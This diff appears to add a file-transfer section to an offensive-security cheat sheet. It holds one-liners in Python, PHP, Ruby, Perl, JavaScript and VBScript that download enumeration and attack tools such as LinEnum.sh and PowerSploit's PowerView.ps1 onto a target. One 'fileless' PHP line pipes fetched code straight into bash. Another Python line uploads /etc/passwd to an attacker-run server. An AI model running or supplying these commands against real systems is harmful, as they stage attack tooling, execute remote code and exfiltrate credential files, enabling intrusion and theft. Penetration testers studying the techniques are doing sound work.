@@ -1354,3 +1354,53 @@ curl -s "https://crt.sh/?q=[domain]&output=json" | jq -r '.[]
   5. From attacker machine 
     wget [victim ip]:8000/file.txt 
 ```
+
+<br>
+
+### Transferring Files with Code 
+```
+# Python 
+  1. Python 2
+    python2.7 -c 'import urllib;urllib.urlretrieve ("[url]", "LinEnum.sh")'
+
+  2. Python 3 
+     python3 -c 'import urllib.request;urllib.request.urlretrieve("[url]", "LinEnum.sh")'
+
+
+# PHP
+  1. File_get_contents()
+    php -r '$file = file_get_contents("[url]"); file_put_contents("LinEnum.sh",$file);'
+
+  2. Fopen()
+    php -r 'const BUFFER = 1024; $fremote = 
+fopen("[url]", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
+
+  3. Fileless
+    php -r '$lines = @file("[url]"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
+
+
+# Ruby 
+  ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("[url]")))'
+
+
+# Perl
+  perl -e 'use LWP::Simple; getstore("[url]", "LinEnum.sh");'
+
+
+# JavaScript 
+  1. https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl/373068
+    Full Command > cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
+
+
+ # VBScript 
+  1. https://stackoverflow.com/questions/2973136/download-a-file-with-vbs
+    Full Command > cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
+
+
+# Python Upload Operation 
+  1. Start Py server 
+    python3 -m uploadserver
+
+  2. Upload One liner 
+    python3 -c 'import requests;requests.post("http://[ip]:[port]/upload",files={"files":open("/etc/passwd","rb")})'
+```
